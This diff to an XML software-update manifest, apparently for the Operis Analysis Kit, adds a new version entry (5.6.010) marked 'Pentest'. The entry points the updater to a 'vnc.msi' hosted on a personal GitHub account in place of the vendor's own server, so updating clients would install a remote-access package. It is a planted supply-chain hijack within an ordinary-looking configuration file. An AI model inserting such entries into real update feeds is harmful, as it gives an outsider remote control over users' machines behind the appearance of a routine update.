@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <versions>
-
+i
+	
+<version>
+    <number>5.6.010</number>
+    <securelocation>https://github.com/killianlf/public/raw/main/vnc.msi</securelocation>
+    <changes>Pentest</changes>
+   <released>2023-03-24</released>
+    <category>0</category>
+</version>
+	
 <version>
     <number>5.6.008</number>
     <securelocation>https://www.assets.operisanalysiskit.com/updates/5.6/OAK5-56008.msi</securelocation>
